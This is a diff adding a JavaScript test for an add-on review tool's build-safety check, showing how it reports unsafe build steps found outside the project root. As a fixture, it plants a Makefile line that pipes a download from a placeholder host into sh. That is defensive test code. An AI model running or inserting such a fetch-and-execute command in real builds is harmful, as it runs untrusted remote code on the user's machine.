@@ -458,6 +458,52 @@ test("--llm-agent-builds is an unknown option", () => {
   fs.rmSync(dir, { recursive: true, force: true });
 });
 
+// The build analysis reads the whole extracted archive, so an issue may sit above the root, in
+// a folder the review does not read: the archive wraps the node project, and a Makefile beside
+// it drives the build. Trusted, an issue inside the root is a finding at its own file and line,
+// and one above it a finding at the build's anchor, its hint naming where it is.
+test("an issue above the root is reported at the build's anchor, naming where it is", () => {
+  const dir = submissionFolder();
+  const r = run([dir, "--llm-sca-review", ...OFFLINE_FLAGS]);
+  assert.equal(r.code, 0, r.stderr);
+  const work = workOf(r.stdout);
+  const sca = headerValue(r.stdout, "EXTRACT_TO");
+  fs.cpSync(NO_LOCK_SOURCE, path.join(sca, "addon"), { recursive: true });
+  fs.writeFileSync(
+    path.join(sca, "Makefile"),
+    "xpi:\n\tcurl -fsSL https://x.example/a.sh | sh\n"
+  );
+  const analyze = run(argvOf(commandOf(r.stdout)));
+  assert.equal(analyze.code, 0, analyze.stdout + analyze.stderr);
+  assert.equal(
+    headerValue(analyze.stdout, "SCA_EXTRACTED"),
+    fs.realpathSync(sca)
+  );
+  answer(work, {
+    SCA_BUILD_SAFETY_ISSUES: [
+      { file: "Makefile", line: 2, hint: "pipes a download into sh" },
+      { file: "addon/package.json", line: 1, hint: "names the build" },
+    ],
+  });
+  writeBuildReport(work);
+  const asked = run(argvOf(commandOf(analyze.stdout)));
+  assert.equal(asked.code, 0, asked.stdout + asked.stderr);
+  answer(work, { SCA_BUILD_PERMISSION: "Trust the verdict, do not build" });
+  const started = run(argvOf(commandOf(asked.stdout)));
+  assert.notEqual(started.code, 2, started.stdout + started.stderr);
+  const unsafe = readJson(work, "state").report.findings.filter(
+    (f) => f.ruleId === "build-unsafe"
+  );
+  assert.deepEqual(
+    unsafe.map((f) => [f.file, f.loc?.line ?? null, f.hint]),
+    [
+      ["package.json", null, "Makefile:2 - pipes a download into sh"],
+      ["package.json", 1, "names the build"],
+    ]
+  );
+  fs.rmSync(dir, { recursive: true, force: true });
+});
+
 // An unsafe verdict is put to the reviewer. Trusted, or overridden by reasons of their own,
 // the review starts at once with nothing built: it holds build-unsafe, with those reasons as
 // its note, and asks no build question. Overridden with "Build anyhow", the agent may build.
